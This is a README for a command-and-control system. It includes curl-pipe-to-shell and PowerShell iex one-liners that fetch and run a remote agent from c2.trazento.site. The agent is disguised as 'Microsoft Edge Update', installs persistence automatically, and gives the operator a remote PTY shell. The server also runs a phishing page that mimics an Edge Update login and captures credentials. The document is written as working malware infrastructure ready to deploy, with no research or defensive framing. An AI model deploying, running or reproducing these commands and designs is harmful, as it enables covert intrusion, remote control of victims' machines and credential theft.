# C2

Command & Control system with persistent PTY shell, deployable via Cloudflare Tunnel.

## Quick Deploy

**Linux (default — binary from c2.trazento.site):**
```bash
sh -c "$(curl -sS https://c2.trazento.site/install.sh)"
```

**Linux (custom binary URL — host it anywhere):**
```bash
C2_AGENT_URL="https://github.com/user/repo/releases/latest/download/c2_agent" \
  sh -c "$(curl -sS https://c2.trazento.site/install.sh)"
```

**Windows (default):**
```powershell
iex (iwr https://c2.trazento.site/install.ps1)
```

**Windows (custom URL):**
```powershell
$env:C2_AGENT_URL="https://example.com/EdgeUpdate.exe"
iex (iwr https://c2.trazento.site/install.ps1)
```

Scripts auto-detect OS/arch, download the matching agent binary, and run it. Persistence is installed automatically on first run.

## Server

```bash
# with self-signed TLS (cert.pem + key.pem required)
./c2_server

# no TLS (for Cloudflare Tunnel — TLS at edge)
./c2_server --no-tls
```

Prints dashboard URL with token at startup:

```
[C2] Server key: W5jFt7L0mM4TZ...
[C2] Dashboard token: _fKrF5Ty6wkbq-DE7ykVnQ
[C2] Dashboard: http://127.0.0.1:8443/?token=_fKrF5Ty6wkbq-DE7ykVnQ
[C2] Install (Linux): curl -sS https://c2.trazento.site/install.sh | sh
[C2] Install (Windows): iex (iwr https://c2.trazento.site/install.ps1)
```

## Dashboard

Open `http://127.0.0.1:8443/?token=<TOKEN>` in a browser.

- Live agent table — green dot = alive, red dot = dead (>30s no heartbeat)
- Click **Shell** to open a terminal on any agent
- Type commands and see real-time output (polls every 500ms)
- Click **Kill** to terminate an agent
- **Honeypot** tab shows captured credentials from the fake login page

## Architecture

```
                          ┌──────────────┐
  Agent ──HTTPS──► Cloudflare Tunnel ──► C2 Server (port 8443)
                          │
            ┌─────────────┴──────────────┐
            ▼                            ▼
      Public domain                  Dashboard
  (honeypot login page)          (localhost / Tailscale)
```

- Public domain serves a fake Microsoft Edge Update login page that captures credentials
- Dashboard is blocked on the public domain (Host header check) — only accessible via `127.0.0.1` or a Tailscale IP
- Agents connect through Cloudflare Tunnel to the same domain

## Deploy with Cloudflare Tunnel

```yaml
# ~/.cloudflared/config.yml
tunnel: <TUNNEL_ID>
credentials-file: /root/.cloudflared/<TUNNEL_ID>.json
ingress:
  - hostname: c2.trazento.site
    service: http://localhost:8443
  - service: http_status:404
```

```bash
cloudflared tunnel run <TUNNEL_ID>
```

## Endpoints

| Route | Purpose |
|---|---|
| `/` | Dashboard (internal) or honeypot login (public) |
| `/install.sh` | Linux install script |
| `/install.ps1` | Windows install script (PowerShell) |
| `/agent/linux/<arch>` | Linux agent binary download |
| `/agent/windows/<arch>` | Windows agent binary download |
| `/api/register` | Agent registration |
| `/api/tasks` | Agent task polling |
| `/api/result` | Agent task result submission |
| `/api/honeypot` | View captured credentials |
| `/api/dash_token` | Get dashboard token |
| `/api/key` | Get public key |

## Operator CLI

```bash
python3 c2_cli.py
```

Interactive console for listing agents, issuing commands, and viewing results.

## Agent

Zero-dependency standalone binary. Features:

- **Persistent PTY shell** (Linux: fork bash with PTY; Windows: cmd.exe pipe)
- **Auto-reconnect** on server restart — syncs key and re-registers
- **Auto-retry** on boot — retries forever until server is reachable
- **Auto-persistence** on first run:
  - Linux: systemd user service + crontab @reboot
  - Windows: Registry Run key + schtasks + Startup folder VBS
- **Kill switch** — agent deletes itself

### Manual (no auto-deploy)

```bash
# Linux
./c2_agent

# Windows (hidden console, looks like "Microsoft Edge Update")
EdgeUpdate.exe
```

Flags:
- `--no-install` — skip persistence installation
- `--install` — force install persistence and exit
- `--remove` — remove all persistence traces and exit

## Build from Source

### Linux
```bash
pip install pyinstaller
pyinstaller --onefile --clean --name c2_server c2_server.py
pyinstaller --onefile --clean --name c2_agent c2_agent.py
```

### Windows (cross-compile with Docker)
```bash
docker run --rm -v "$PWD:/work" cdrx/pyinstaller-windows \
  "pip install pyinstaller && pyinstaller --onefile --noconsole --name EdgeUpdate \
  --icon <icon> --version-file version.txt --hidden-import winreg c2_agent.py"
```

Set the agent's `SERVER` constant to your domain before building:
```python
SERVER = "https://c2.trazento.site"
```

## Crypto

HMAC-SHA256 keyed-authenticated CTR mode using Python stdlib only (`hashlib`, `hmac`, `os.urandom`). No `cryptography` dependency.

## Persistence (Agent)

- **Linux**: `~/.config/systemd/user/c2.service` + `@reboot /path/to/agent` in crontab
- **Windows**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, `schtasks /create`, `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\EdgeUpdate.vbs`
- Log: `%TEMP%\edgeupdate.log`

## Files

| File | Description |
|---|---|
| `c2_server.py` | Flask server (dashboard + API + honeypot) |
| `c2_agent.py` | Zero-dep agent binary source |
| `c2_cli.py` | Operator CLI |
| `c2_server` | Linux server binary |
| `c2_agent` | Linux agent binary |
| `EdgeUpdate.exe` | Windows agent binary (GUI, MS metadata) |
| `cert.pem` / `key.pem` | Self-signed TLS certs |
| `.cloudflared/config.yml` | Cloudflare tunnel ingress rules |
